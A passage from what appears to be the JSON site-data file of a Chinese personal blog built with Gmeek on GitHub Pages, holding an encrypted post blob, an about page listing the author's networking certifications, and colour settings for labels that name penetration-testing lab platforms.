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-->\n<!--/encrypt-->sentence", "top": 0, "createdAt": 1756994898, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script><script src='https://7r1umphk.github.io/plugins/jiami.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-09-04", "dateLabelColor": "#0969da"}}, "singeListJson": {"P202": {"htmlDir": "docs/about.html", "labels": ["about"], "postTitle": "about", "postUrl": "about.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/202", "commentNum": 0, "wordCount": 671, "description": "\n\n# \ud83d\udc4b \u5173\u4e8e\u6211\n\n![GitHub \u6d3b\u8dc3\u56fe](https://ghchart.rshah.org/7r1umphk)\n\n## \ud83c\udf1f \u4eba\u751f\u8f68\u8ff9\n\n- \ud83e\udd47 \u67d0\u7701\u6280\u80fd\u5927\u8d5b **\u901a\u4fe1\u65b9\u5411\u4e00\u7b49\u5956**\n- \ud83c\udf93 \u67d0\u77e5\u540d\u5927\u4e13\u9662\u6821\u6bd5\u4e1a\n- \ud83d\udce1 **HCIP-Datacom** \u6301\u8bc1\n- \ud83d\udcda \u6b63\u5728\u5907\u8003 **HCIE-Datacom**\n\n## \ud83d\udcbb \u6280\u672f\u6808\n\n- \ud83d\udc0d Python\uff08\u5165\u95e8\u63a2\u7d22\uff09\n- \ud83d\udda5 Bash\uff08\u5165\u95e8\u5b9e\u8df5\uff09\n- \ud83d\udce1 Datacom\uff08HCIP \u5df2\u8fc7\uff0cHCIE \u5907\u8003\u4e2d\uff09\n- \u2728 JavaScript\uff08\u5076\u5c14\u5c1d\u8bd5\uff09\n\n# \ud83d\udcdd \u5173\u4e8e\u672c\u7ad9\n\n\u672c\u7ad9\u59cb\u4e8e **2025/01/29**\uff0c\u91c7\u7528 **GitHub Pages + gmeek** \u642d\u5efa\u3002\n \u4e3b\u8981\u8bb0\u5f55\u5b66\u4e60\u5386\u7a0b\u4e0e\u4e00\u4e9b\u4e2a\u4eba\u7edf\u8ba1\uff0c\u65e2\u662f\u7ed9\u81ea\u5df1\u7559\u6863\uff0c\u4e5f\u5e0c\u671b\u80fd\u5bf9\u4ed6\u4eba\u6709\u70b9\u53c2\u8003\u4ef7\u503c\u3002\n\n## \ud83d\udcb0 \u8fd0\u884c\u6210\u672c\n\n- **0 \u5143**\uff08\u5b8c\u5168\u6258\u7ba1\u5728 GitHub\uff09\n\n## \ud83d\udcc5 \u7ad9\u70b9\u5927\u4e8b\u8bb0\n\n| \u65e5\u671f       | \u6539\u52a8/\u4e8b\u4ef6                                 |\n| ---------- | ----------------------------------------- |\n| 2023/01/29 | \u4f7f\u7528 GitHub Pages \u642d\u5efa gmeek \u535a\u5ba2         |\n| \u2026          | \u4e00\u7cfb\u5217\u7f8e\u5316\u4e0e\u529f\u80fd\u8c03\u6574                      |\n| 2025/06/26 | \u56e0\u8d26\u53f7\u4e22\u5931\uff0c\u91cd\u5f00\u4e8e **7r1umphk.github.io** |\n\nsentence", "top": 0, "createdAt": 1754812270, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-10", "dateLabelColor": "#0969da"}, "P35": {"htmlDir": "docs/link.html", "labels": ["link"], "postTitle": "\u53cb\u94fe", "postUrl": "link.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/35", "commentNum": 0, "wordCount": 99, "description": "<!-- ##{'script':'<script src='https://7r1umphk.github.io/plugins/FriendLinks.js'></script>'}## -->sentence", "top": 0, "createdAt": 1751016578, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script><script src='https://7r1umphk.github.io/plugins/FriendLinks.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}}, "labelColorDict": {"about": "#7ce0d1", "HackMyVM": "#bbddba", "HackMyVM_Challenge": "#f9d0c4", "HackMyVM_Labs": "#4c5e88", "link": "#45338a", "thehackerlabs": "#9aff9d", "vulnhub": "#65357f", "vulnyx": "#e254f5", "\u5185\u90e8\u9776\u673a/maze-sec": "#39b671", "\u534e\u4e3a\u6570\u901a": "#598dc4", "\u5439\u6c34": "#310ca4", "\u5de5\u5177": "#bec68d", "\u77e5\u8bc6": "#09894a", "\u7ef4\u62a4": "#a6b6ed"}, "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "homeUrl": "https://7r1UMPHK.github.io", "prevUrl": "/page15.html", "nextUrl": "disabled"}